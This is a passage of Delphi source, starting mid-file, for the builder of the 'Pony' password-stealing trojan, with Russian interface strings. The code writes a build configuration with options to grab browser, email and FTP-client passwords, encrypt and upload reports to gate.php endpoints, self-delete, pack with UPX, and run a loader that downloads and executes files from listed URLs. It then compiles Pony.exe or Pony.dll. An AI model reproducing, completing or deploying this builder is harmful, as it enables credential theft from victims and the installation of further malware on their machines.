        ConsoleMessageBox(Handle, PChar('Неизвестный параметр: ' + ParamStr(i)), 'Ошибка', MB_ICONERROR);
        Exit;
      end;
    end else begin
      ConsoleMessageBox(Handle, PChar('Неизвестный параметр: ' + ParamStr(i)), 'Ошибка', MB_ICONERROR);
      Exit;
    end;
  end;

  if Pass = '' then
    Pass := 'Mesoamerica';

  Self.PasswordEdit.Text := Pass;

  BuildButtonClick(Self);
end;

procedure TMainForm.ConsoleMessageBox(Handle: THandle; Msg: PChar; Caption: PChar; Flags: LongWord);
begin
  if (FCommandLineMode) and (FConsoleAttached) then begin
    Writeln('(' + StrPas(Caption) + ') ' + StrPas(Msg));
  end else
    MessageBox(Handle, Msg, Caption, Flags);
end;

procedure TMainForm.DisableGrabberCheckBoxClick(Sender: TObject);
begin
  DomainList.Enabled := not TCheckBox(Sender).Checked;
end;

procedure TMainForm.DllModeCheckBoxClick(Sender: TObject);
begin
  BuildWithExeRelocsCheckBox.Enabled := False;
end;

function ModPass(const Password: String): String;
var
  i: Integer;
begin
  Result := Password;
  for i := 1 to Length(Password) do begin
    Result[i] := Chr((Ord(Result[i])+2));
  end;
end;

procedure TMainForm.BuildButtonClick(Sender: TObject);
var
  i: Integer;
  S: TStringList;
  Domain: String;
  AsmDomainList, ExtraArgs: String;
  StrOutput, ErrOutput: TStringList;
  ModuleChecked: Boolean;
  SPackInfo: String;
  ResultFile: String;
  UploadRetries: Integer;
const
  CResultDllFile = 'Pony.dll';
  CResultExeFile = 'Pony.exe';
  CBuildBatchFile = 'build.bat';
  CConfigFile = 'Config.inc';
  CMasm32Dir = 'masm32';
  CUPXPackFile = CMasm32Dir + '\bin\upx.exe';
begin
  if not FCommandLineMode then
    SaveSettings;

  if DllModeCheckBox.Checked then
    ResultFile := CResultDllFile
  else
    ResultFile := CResultExeFile;

  DeleteFile(AppDir + ResultFile);

  if FileExists(AppDir + ResultFile) then begin
    ConsoleMessageBox(Handle, PChar('Невозможно удалить файл "' + ResultFile + '", вероятно, приложение запущено.'), 'Ошибка!', MB_ICONERROR);
    Exit;
  end;

  if not FileExists(AppDir + CBuildBatchFile) then begin
    ConsoleMessageBox(Handle, 'Отсутствует необходимый для компиляции скрипт "' + CBuildBatchFile + '".', 'Ошибка!', MB_ICONERROR);
    Exit;
  end;

  if not DirectoryExists(AppDir + CMasm32Dir) then begin
    ConsoleMessageBox(Handle, 'Отсутствует директория с компилятором "' + CMasm32Dir + '".', 'Ошибка!', MB_ICONERROR);
    Exit;
  end;

  if (AddIconCheckBox.Checked) and (not FileExists(AppDir + 'Pony.ico')) then begin
    ConsoleMessageBox(Handle, 'Иконка не найдена!'#13#10'Необходимо выбрать иконку или отключить опцию "добавить иконку".', 'Ошибка!', MB_ICONERROR);
    Exit;
  end;

  if (Trim(DomainList.Text) = '') and (not DisableGrabberCheckBox.Checked) then begin
    ConsoleMessageBox(Handle, 'Необходимо добавить хотя бы 1 домен.', 'Ошибка!', MB_ICONERROR);
    Exit;
  end;

  if (ActivateLoaderCheckBox.Checked) and (Trim(LoaderList.Text) = '') then begin
    ConsoleMessageBox(Handle, 'Необходимо указать хотя бы один URL для загрузки или отключить лоадер.', 'Ошибка!', MB_ICONERROR);
    Exit;
  end;

  if (not ActivateLoaderCheckBox.Checked) and (DisableGrabberCheckBox.Checked) then begin
    ConsoleMessageBox(Handle, 'Отключены функции сбора паролей и лоадера. Необходимо активировать хоть какой-либо функционал.', 'Ошибка!', MB_ICONERROR);
    Exit;
  end;

  S := TStringList.Create;
  S.Add('.data'#13#10);
  S.Add('; Module optional compilation');
  ModuleChecked := False;
  for i := 0 to ModuleListView.Items.Count-1 do
    if ModuleListView.Items[i].Checked then begin
      S.Add('COMPILE_' + PString(ModuleListView.Items[i].Data)^ + ' EQU 1');
      ModuleChecked := True;
    end;
  S.Add('');

  if not ModuleChecked then begin
    ConsoleMessageBox(Handle, 'Необходимо выбрать хотя бы 1 модуль дешифровки.', 'Ошибка!', MB_ICONERROR);
    S.Free;
    Exit;
  end;

  S.Add('; Advanced options');
  if (PackCheckBox.Checked) then
    S.Add('PACK_REPORT equ 1');
  if (EncryptCheckBox.Checked) then
    S.Add('ENCRYPT_REPORT equ 1');
  if (SaveReportCheckBox.Checked) then
    S.Add('SAVE_REPORT equ 1');

  if (DebugModeCheckBox.Checked) then
    S.Add('ENABLE_DEBUG_MODE equ 1');
  if (SendModifiedCheckBox.Checked) then
    S.Add('SEND_MODIFIED_ONLY equ 1');
  if (SelfDeleteCheckBox.Checked) then
    S.Add('SELF_DELETE equ 1');
  if (SendEmptyReportsCheckBox.Checked) then
    S.Add('SEND_EMPTY_REPORTS equ 1');

  if DllModeCheckBox.Checked then
    S.Add('DLLMODE equ 1');

  if CollectHTTPPasswordsCheckBox.Checked then
	  S.Add('GRAB_HTTP equ 1');

  if CollectEmailPasswordsCheckBox.Checked then
    S.Add('GRAB_EMAIL equ 1');

  if UPXCheckBox.Checked then
    S.Add('USE_UPX equ 1');

  if DisableGrabberCheckBox.Checked then
    S.Add('DISABLE_GRABBER equ 1');

  try
    UploadRetries := StrToInt(UploadRetriesEdit.Text);
  except
    UploadRetries := 1;
  end;

  if UploadRetries < 1 then
    UploadRetries := 1;
  S.Add('UPLOAD_RETRIES equ ' + IntToStr(UploadRetries));

  if EncryptCheckBox.Checked then begin
    if (Trim(PasswordEdit.Text) <> '')  then begin
      S.Add('CReportPassword db "' + StringReplace(ModPass(Trim(PasswordEdit.Text)), '"', '""', [rfReplaceAll]) + '",0');
	end else begin
      ConsoleMessageBox(Handle, 'Необходимо указать пароль или отключить опцию шифрования.', 'Ошибка!', MB_ICONERROR);
      S.Free;
      Exit;
    end;
  end;

  if not DisableGrabberCheckBox.Checked then begin
    S.Add('');
    S.Add('; Domain list');
    AsmDomainList := 'szDomainList ';

    for i := 0 to DomainList.Lines.Count-1 do begin
      Domain := Trim(DomainList.Lines[i]);
      if (Domain = '') or (Domain = 'http://') or (Domain = 'https://') then
        Continue;
      if (Pos('http://', Domain) = 0) and (Pos('https://', Domain) = 0) then
        Domain := 'http://' + Domain;

      Domain := 'db "' + StringReplace(Domain, '"', '""', [rfReplaceAll]) + '",0'#13#10;
      AsmDomainList := AsmDomainList + Domain;
    end;
  end;

  AsmDomainList := AsmDomainList + 'db 0';
  S.Add(AsmDomainList);

  if (ActivateLoaderCheckBox.Checked) and (Trim(LoaderList.Text) <> '') then begin
    S.Add('');
    S.Add('; Loader list');
    AsmDomainList := 'szLoaderList ';
    for i := 0 to LoaderList.Lines.Count-1 do begin
      Domain := Trim(LoaderList.Lines[i]);
      if (Domain = '') or (Domain = 'http://') or (Domain = 'https://') then
        Continue;
      if (Pos('http://', Domain) = 0) and (Pos('https://', Domain) = 0) then
        Domain := 'http://' + Domain;

      Domain := 'db "' + StringReplace(Domain, '"', '""', [rfReplaceAll]) + '",0'#13#10;
      AsmDomainList := AsmDomainList + Domain;
    end;
    AsmDomainList := AsmDomainList + 'db 0';
    S.Add(AsmDomainList);
    S.Add('ENABLE_LOADER equ 1');
    if LoaderDupeCheckbox.Checked then
      S.Add('LOADER_EXECUTE_NEW_FILES_ONLY equ 1');
    if ReserveLoaderModeCheckBox.Checked then
      S.Add('LOADER_RESERVE_MODE equ 1');
  end;

  StrOutput := TStringList.Create;
  ErrOutput := TStringList.Create;

  try
    S.SaveToFile(AppDir + CConfigFile);

    if AddIconCheckBox.Checked then
      ExtraArgs := ' build_rc'
    else
      ExtraArgs := '';

    if DllModeCheckBox.Checked then
      ExtraArgs := ExtraArgs + ' dll';

    if BuildWithExeRelocsCheckBox.Checked then
      ExtraArgs := ExtraArgs + ' relocs';

    ExecConsoleApp('"' + AppDir + CBuildBatchFile + '"' + ExtraArgs, StrOutput, ErrOutput);

    if not FileExists(ResultFile) then begin
      with TErrorForm.Create(Self) do begin
        ErrorMemo.Text := Trim(StrOutput.Text) + #13#10 + Trim(ErrOutput.Text);
        ShowModal;
        Free;
      end;
    end else begin
      SPackInfo := '';
      if UPXCheckBox.Checked then begin
        if not FileExists(AppDir + CUPXPackFile) then
          ConsoleMessageBox(Handle, PChar('Исполняемый файл "' + CUPXPackFile + '" отсутствует. Паковка невозможна.'),
            'Ошибка!', MB_ICONERROR)
        else begin
          SPackInfo := #13#10'Размер до паковки UPX ' + IntToStr(xGetFileSize(ResultFile)) + ' байт.';
          ExecConsoleApp('"' + AppDir + CUPXPackFile + '" "' + AppDir + ResultFile + '" --lzma --best', StrOutput, ErrOutput);
        end;
      end;
      ConsoleMessageBox(Handle, PChar('Файл "' + ResultFile + '" успешно создан. Размер ' + IntToStr(xGetFileSize(ResultFile)) + ' байт.' +
        SPackInfo),
        'Успех!', MB_ICONINFORMATION);
    end;
  except
    ConsoleMessageBox(Handle, PChar('Невозможно сохранить на диск файл настроек "' + CConfigFile + '".'), 'Ошибка!', MB_ICONERROR);
  end;
  S.Free;

  StrOutput.Free;
  ErrOutput.Free;
end;

procedure TMainForm.LoadSettings;
var
  ini: TMemIniFile;
  M: TMemoryStream;
  i: Integer;
begin
  M := TMemoryStream.Create;
  ini := nil;
  try
    ini := TMemIniFile.Create(AppDir + CPonyIniFile);

    PackCheckBox.Checked := ini.ReadBool('main', 'PackCheckBox', True);
    EncryptCheckBox.Checked := ini.ReadBool('main', 'EncryptCheckBox', True);
    SaveReportCheckBox.Checked := ini.ReadBool('main', 'SaveReportCheckBox', False);
    PasswordEdit.Text := ini.ReadString('main', 'PasswordEdit', 'Mesoamerica');

    DebugModeCheckBox.Checked := ini.ReadBool('main', 'DebugModeCheckBox', False);
    SendModifiedCheckBox.Checked := ini.ReadBool('main', 'SendModifiedCheckBox', False);
    SelfDeleteCheckBox.Checked := ini.ReadBool('main', 'SelfDeleteCheckBox', False);
    AddIconCheckBox.Checked := ini.ReadBool('main', 'AddIconCheckBox', False);

    UPXCheckBox.Checked := ini.ReadBool('main', 'UPXCheckBox', False);
    SendEmptyReportsCheckBox.Checked := ini.ReadBool('main', 'SendEmptyReportsCheckBox', True);
    ShowAdvancedOptionsMenuItem.Checked := ini.ReadBool('main', 'ShowAdvancedOptionsMenuItem', False);
    ActivateLoaderCheckBox.Checked := ini.ReadBool('main', 'ActivateLoaderCheckBox', False);
    LoaderDupeCheckbox.Checked := ini.ReadBool('main', 'LoaderDupeCheckbox', False);

    CollectHTTPPasswordsCheckBox.Checked := ini.ReadBool('main', 'CollectHTTPPasswordsCheckBox', False);
    CollectEmailPasswordsCheckBox.Checked := ini.ReadBool('main', 'CollectEmailPasswordsCheckBox', False);
    UploadRetriesEdit.Text := ini.ReadString('main', 'UploadRetriesEdit', '2');

    if ShowAdvancedOptionsMenuItem.Checked = False then
      RedrawAdvancedItems;

    sSkinManager1.SkinName := ini.ReadString('main', 'SkinName', 'Opus (internal)');
    sSkinManager1.Active := True;

    Width := ini.ReadInteger('main', 'Width', Width);
    Height := ini.ReadInteger('main', 'Height', Height);
    sPageControl1.TabIndex := ini.ReadInteger('main', 'TabIndex', 0);

    ExeModeCheckBox.Checked := ini.ReadBool('main', 'ExeModeCheckBox', True);
    DllModeCheckBox.Checked := ini.ReadBool('main', 'DllModeCheckBox', False);

    for i := 0 to ModuleListView.Items.Count-1 do
      ModuleListView.Items[i].Checked :=  ini.ReadBool('ftp_clients', PString(ModuleListView.Items[i].Data)^, True);

    DebugModeCheckBox.Checked := ini.ReadBool('main', 'DebugModeCheckBox', False);
    BuildWithExeRelocsCheckBox.Checked := ini.ReadBool('main', 'BuildWithExeRelocsCheckBox', False);
    ReserveLoaderModeCheckBox.Checked := ini.ReadBool('main', 'ReserveLoaderModeCheckBox', False);

    DisableGrabberCheckBox.Checked := ini.ReadBool('main', 'DisableGrabberCheckBox', False);

    if ini.ValueExists('main', 'domain_list') then begin
      ini.ReadBinaryStream('main', 'domain_list', M);

      DomainList.Lines.LoadFromStream(M);
      DomainList.Lines.Text := Trim(DomainList.Lines.Text);
    end else
      DomainList.Lines.Text := 'http://mainserver.com/gate.php'#13#10'http://reservehost.com/path/gate.php';

    M.Clear;
    if ini.ValueExists('main', 'loader_list') then begin
      ini.ReadBinaryStream('main', 'loader_list', M);

      LoaderList.Lines.LoadFromStream(M);
      LoaderList.Lines.Text := Trim(LoaderList.Lines.Text);
    end else
      LoaderList.Lines.Text := 'http://serverx.com/y/file.exe'#13#10'http://uhost.ru/calculator.exe';

  except
  end;
  if ini <> nil then
    ini.Free;
  M.Free;


  LoaderList.Enabled := ActivateLoaderCheckBox.Checked;
  BuildWithExeRelocsCheckBox.Enabled := ExeModeCheckBox.Checked;
end;

procedure TMainForm.SaveSettings;
var
  ini: TMemIniFile;
  M: TMemoryStream;
  i: Integer;
begin
  M := TMemoryStream.Create;
  ini := nil;
  try
    ini := TMemIniFile.Create(AppDir + CPonyIniFile);
    ini.WriteBool('main', 'PackCheckBox', PackCheckBox.Checked);
    ini.WriteBool('main', 'EncryptCheckBox', EncryptCheckBox.Checked);
    ini.WriteBool('main', 'SaveReportCheckBox', SaveReportCheckBox.Checked);
    ini.WriteString('main', 'PasswordEdit', PasswordEdit.Text);

    ini.WriteBool('main', 'DebugModeCheckBox', DebugModeCheckBox.Checked);
    ini.WriteBool('main', 'SendModifiedCheckBox', SendModifiedCheckBox.Checked);
    ini.WriteBool('main', 'SelfDeleteCheckBox', SelfDeleteCheckBox.Checked);
    ini.WriteBool('main', 'AddIconCheckBox', AddIconCheckBox.Checked);

    ini.WriteBool('main', 'DebugModeCheckBox', DebugModeCheckBox.Checked);
    ini.WriteBool('main', 'UPXCheckBox', UPXCheckBox.Checked);
    ini.WriteBool('main', 'SendEmptyReportsCheckBox', SendEmptyReportsCheckBox.Checked);
    ini.WriteBool('main', 'ShowAdvancedOptionsMenuItem', ShowAdvancedOptionsMenuItem.Checked);
    ini.WriteBool('main', 'ActivateLoaderCheckBox', ActivateLoaderCheckBox.Checked);
    ini.WriteBool('main', 'LoaderDupeCheckbox', LoaderDupeCheckbox.Checked);

    ini.WriteString('main', 'SkinName', sSkinManager1.SkinName);

    ini.WriteInteger('main', 'Width', Width);
    ini.WriteInteger('main', 'Height', Height);
    ini.WriteInteger('main', 'TabIndex', sPageControl1.TabIndex);

    ini.WriteBool('main', 'ExeModeCheckBox', ExeModeCheckBox.Checked);
    ini.WriteBool('main', 'DllModeCheckBox', DllModeCheckBox.Checked);

    ini.WriteBool('main', 'CollectHTTPPasswordsCheckBox', CollectHTTPPasswordsCheckBox.Checked);
    ini.WriteBool('main', 'CollectEmailPasswordsCheckBox', CollectEmailPasswordsCheckBox.Checked);
    ini.WriteString('main', 'UploadRetriesEdit', UploadRetriesEdit.Text);
    ini.WriteBool('main', 'BuildWithExeRelocsCheckBox', BuildWithExeRelocsCheckBox.Checked);
    ini.WriteBool('main', 'ReserveLoaderModeCheckBox', ReserveLoaderModeCheckBox.Checked);

    ini.WriteBool('main', 'DisableGrabberCheckBox', DisableGrabberCheckBox.Checked);

    for i := 0 to ModuleListView.Items.Count-1 do
      ini.WriteBool('ftp_clients', PString(ModuleListView.Items[i].Data)^, ModuleListView.Items[i].Checked);

    DomainList.Lines.SaveToStream(M);
    M.Seek(0, 0);
    ini.WriteBinaryStream('main', 'domain_list', M);

    M.Clear;
    LoaderList.Lines.SaveToStream(M);
    M.Seek(0, 0);
    ini.WriteBinaryStream('main', 'loader_list', M);

    ini.UpdateFile;
  except
  end;
  FreeAndNil(ini);
  M.Free;
end;

procedure TMainForm.FormClose(Sender: TObject; var Action: TCloseAction);
begin
  SaveSettings;
end;

procedure TMainForm.SkinListViewDblClick(Sender: TObject);
begin
  if SkinListView.Selected <> nil then begin
    if sSkinManager1.SkinName <> SkinListView.Selected.Caption then
      sSkinManager1.SkinName := SkinListView.Selected.Caption;
  end;
end;

procedure TMainForm.SelectAllMenuItemClick(Sender: TObject);
var
  i: Integer;
begin
  ModuleListView.Items.BeginUpdate;
  for i := 0 to ModuleListView.Items.Count-1 do
    ModuleListView.Items[i].Checked := True;
  ModuleListView.Items.EndUpdate;
end;

procedure TMainForm.CleartAllMenuItemClick(Sender: TObject);
var
  i: Integer;
begin
  ModuleListView.Items.BeginUpdate;
  for i := 0 to ModuleListView.Items.Count-1 do
    ModuleListView.Items[i].Checked := False;
  ModuleListView.Items.EndUpdate;
end;

procedure TMainForm.RedrawAdvancedItems;
begin
  if not ShowAdvancedOptionsMenuItem.Checked then begin
    SaveReportCheckBox.Visible := False;
    DebugModeCheckBox.Visible := False;
    SendEmptyReportsCheckBox.Top := SendEmptyReportsCheckBox.Top - 24;
    sLabel1.Top := sLabel1.Top - 24;
    sLabel2.Top := sLabel2.Top - 24;
    PasswordEdit.Top := PasswordEdit.Top - 24;
    sDecryptList.Top := sDecryptList.Top - 24;
    sGroupBox1.Height := sGroupBox1.Height - 24;
    sGroupBox3.Height := sGroupBox3.Height - 24;
    sDecryptList.Height := sDecryptList.Height + 24;
    SendModifiedCheckBox.Top := SendModifiedCheckBox.Top - 24;
    SelfDeleteCheckBox.Top := SelfDeleteCheckBox.Top - 24;
    AddIconCheckBox.Top := AddIconCheckBox.Top - 24;
    UPXCheckBox.Top := UPXCheckBox.Top - 24;
    sModeGroupBox.Top := sModeGroupBox.Top - 24;
    UploadRetriesEdit.Top := UploadRetriesEdit.Top - 24;
  end else begin
    SaveReportCheckBox.Visible := True;
    DebugModeCheckBox.Visible := True;
    SendEmptyReportsCheckBox.Top := SendEmptyReportsCheckBox.Top + 24;
    sLabel1.Top := sLabel1.Top + 24;
    sLabel2.Top := sLabel2.Top + 24;
    PasswordEdit.Top := PasswordEdit.Top + 24;
    sDecryptList.Top := sDecryptList.Top + 24;
    sGroupBox1.Height := sGroupBox1.Height + 24;
    sGroupBox3.Height := sGroupBox3.Height + 24;
    sDecryptList.Height := sDecryptList.Height - 24;
    SendModifiedCheckBox.Top := SendModifiedCheckBox.Top + 24;
    SelfDeleteCheckBox.Top := SelfDeleteCheckBox.Top + 24;
    AddIconCheckBox.Top := AddIconCheckBox.Top + 24;
    UPXCheckBox.Top := UPXCheckBox.Top + 24;
    sModeGroupBox.Top := sModeGroupBox.Top + 24;
    UploadRetriesEdit.Top := UploadRetriesEdit.Top + 24;
  end;
end;

procedure TMainForm.ShowAdvancedOptionsMenuItemClick(Sender: TObject);
begin
  RedrawAdvancedItems;
end;

procedure TMainForm.FormDestroy(Sender: TObject);
begin
  FreeAndNil(ModuleFileSize);
end;

procedure TMainForm.SkinListViewKeyPress(Sender: TObject; var Key: Char);
begin
  if Key = #13 then begin
     SkinListViewDblClick(Sender);
  end;
end;

end.
